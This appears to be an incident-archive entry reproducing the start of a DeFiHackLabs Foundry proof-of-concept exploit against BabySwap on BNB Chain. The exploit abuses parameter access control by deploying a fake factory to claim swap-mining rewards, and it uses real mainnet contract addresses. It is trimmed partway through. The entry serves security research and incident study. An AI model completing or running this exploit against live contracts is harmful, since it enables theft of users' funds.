# [?] BabySwap - Parameter Access Control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BabySwap
Published: 2022-10-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BabySwap_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BABY_TOKEN = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
    IBabySwapRouter constant BABYSWAP_ROUTER = IBabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);
    ISwapMining constant SWAP_MINING = ISwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);
    address constant BABYSWAP_FACTORY = 0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da;

    function setUp() public {
        vm.createSelectFork("bsc", 21_811_979);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
        vm.label(address(BABY_TOKEN), "BABY_TOKEN");
        vm.label(address(BABYSWAP_ROUTER), "BABYSWAP_ROUTER");
        vm.label(address(SWAP_MINING), "SWAP_MINING");
        vm.label(BABYSWAP_FACTORY, "BABYSWAP_FACTORY");
        vm.label(0xE730C7B7470447AD4886c763247012DfD233bAfF, "USDT_BABY_BABYPAIR");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );
        (bool success,) = address(WBNB_TOKEN).call{value: 20_000}("");
        require(success, "Transfer failed.");
        WBNB_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);
        BABY_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);

        // create fakefactory
        FakeFactory factory = new FakeFactory();

        // swap token to claim reward
        address[] memory path1 = new address[](2);
        path1[0] = address(WBNB_TOKEN);
        path1[1] = address(USDT_TOKEN);
        address[] memory factories = new address[](1);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BabySwap_exp.sol_
